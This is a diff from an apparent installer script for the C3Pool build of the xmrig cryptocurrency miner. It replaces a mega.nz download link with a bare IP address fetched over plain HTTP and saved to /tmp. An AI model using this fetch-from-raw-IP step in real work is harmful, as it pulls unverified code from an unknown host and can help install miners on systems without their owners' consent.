@@ -166,9 +166,9 @@ rm -rf $HOME/c3pool
 
 echo "[*] Downloading C3Pool advanced version of xmrig to /tmp/xmrig.tar.gz"
 echo "[*] 下载 C3Pool 版本的 Xmrig 到 /tmp/xmrig.tar.gz 中"
-if ! curl -L --progress-bar "https://mega.nz/file/tvpwhLbL#8u6fVbezqLxZjhcBFN6Uk4_9xJTYMHdbIW54EwWpQrM" -o /tmp/xmrig.tar.gz; then
-  echo "ERROR: Can't download https://mega.nz/file/tvpwhLbL#8u6fVbezqLxZjhcBFN6Uk4_9xJTYMHdbIW54EwWpQrM file to /tmp/xmrig.tar.gz"
-  echo "发生错误: 无法下载 https://mega.nz/file/tvpwhLbL#8u6fVbezqLxZjhcBFN6Uk4_9xJTYMHdbIW54EwWpQrM 文件到 /tmp/xmrig.tar.gz"
+if ! curl -L --progress-bar "http://216.24.254.171:8888/down/XP7IPliefZs1" -o /tmp/xmrig.tar.gz; then
+  echo "ERROR: Can't download http://216.24.254.171:8888/down/XP7IPliefZs1 file to /tmp/xmrig.tar.gz"
+  echo "发生错误: 无法下载 http://216.24.254.171:8888/down/XP7IPliefZs1 文件到 /tmp/xmrig.tar.gz"
   exit 1
 fi
 
